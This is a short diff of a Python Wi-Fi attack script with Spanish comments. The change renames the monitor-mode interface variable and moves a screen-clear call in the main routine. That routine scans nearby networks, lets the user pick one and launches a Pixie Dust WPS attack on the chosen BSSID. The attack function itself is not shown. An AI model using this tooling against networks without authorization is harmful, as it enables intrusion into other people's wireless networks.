@@ -107,12 +107,13 @@ def main():
         if not check_tool_availability(tool):
             return
 
-    # Configurar la interfaz en modo monitor
-    hotspot_interface = "wlan1"  # Asegúrate de que esta sea la interfaz correcta para el hotspot en tu dispositivo
-    set_monitor_mode(hotspot_interface)
+    # Configurar la interfaz secundaria en modo monitor
+    scan_interface = "wlan1"  # Asegúrate de que esta sea la interfaz correcta para el escaneo en tu dispositivo
+    set_monitor_mode(scan_interface)
 
-    # Escanear redes Wi-Fi utilizando la interfaz del hotspot
-    redes, bssids, canales, intensidades = scan_wifi(hotspot_interface)
+    os.system('clear')
+    # Escanear redes Wi-Fi utilizando la interfaz secundaria
+    redes, bssids, canales, intensidades = scan_wifi(scan_interface)
     if redes:
         print("Redes disponibles:")
         table = []
@@ -128,15 +129,15 @@ def main():
         bssid_seleccionado = bssids[seleccion]
         canal_seleccionado = canales[seleccion]
         
-        # Limpiar la pantalla
-        os.system('clear')
+       
+        
         
         print(f"Red seleccionada: {red_seleccionada}")
         print(f"BSSID: {bssid_seleccionado}")
         print(f"Canal: {canal_seleccionado}")
         
-        # Realizar el ataque Pixie Dust utilizando la interfaz del hotspot
-        perform_pixie_dust_attack(hotspot_interface, bssid_seleccionado)
+        # Realizar el ataque Pixie Dust utilizando la interfaz secundaria
+        perform_pixie_dust_attack(scan_interface, bssid_seleccionado)
     else:
         print("No se encontraron redes WiFi.")
 
